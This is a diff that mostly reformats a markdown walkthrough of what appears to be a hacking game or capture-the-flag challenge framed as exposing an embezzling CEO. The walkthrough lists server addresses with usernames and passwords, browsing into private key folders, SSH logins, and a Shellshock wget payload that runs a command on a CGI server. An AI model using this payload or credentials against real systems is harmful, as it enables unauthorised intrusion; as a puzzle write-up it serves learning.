@@ -9,14 +9,14 @@ start at:
 want to prove that CEO is embezzling funds.
 
 gives employee portal:
-`104.236.74.251`
-user: `jameson`
-pass: `hunter72`
+* `104.236.74.251`
+* user: `jameson`
+* pass: `hunter72`
 
 gives bank interface:
-`104.236.74.251:3000`
-user: `bank`
-pass: `pbeukpbnhovhyixcialnlhpzo`
+* `104.236.74.251:3000`
+* user: `bank`
+* pass: `pbeukpbnhovhyixcialnlhpzo`
 
 
 ## 2 - Bank & Employee Portal
@@ -38,6 +38,7 @@ gives URL to scraped accounts:
 starts at: `http://104.236.74.251/`
 
 personal site: `http://104.236.74.251/~dglenn/`
+
 see poems, go up a folder, see files: `http://104.236.74.251/~dglenn/private/`
 
 one of the keys: `http://104.236.74.251/~dglenn/private/key.txt`
@@ -70,14 +71,12 @@ will access the boss dosc here: `http://104.236.74.251/` (user `bdupont`)
 Apache & CGI? **SHELLSHOCK**!
 
 `wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ls" http://104.131.92.247/index.cgi`
+
 [resource](http://security.stackexchange.com/a/68203/44738)
 
 gives us the files:
-
  * `index.cgi` - has code to trigger Shellshock
-
  * `index.php` - redirects to `index.cgi`
-
  * `admin.php` - redirects to `gist.github` and `die()`
 
 
@@ -109,9 +108,8 @@ Carla Lynn
 
 ## 4 - Jhendricks
 frontend is at: `104.131.92.247`
-
-user: `jhendricks`
-pass: `oXwBJMtx3BJ5yKg`
+* user: `jhendricks`
+* pass: `oXwBJMtx3BJ5yKg`
 
 Those are valid SSH creds. Login.
 
@@ -149,13 +147,13 @@ Received: by mail3.thenorth.com
 
 
 Could login to `45.55.47.192` with `wscott`:
-user: `wscott`
-pass: `oTLhoRZ8JOIDhkD`
+* user: `wscott`
+* pass: `oTLhoRZ8JOIDhkD`
 
 ## 5 - Wscott
 SSH to `45.55.47.192`
-user: `wscott`
-pass: `oTLhoRZ8JOIDhkD`
+* user: `wscott`
+* pass: `oTLhoRZ8JOIDhkD`
 
 `cat secretkey/README`:
 
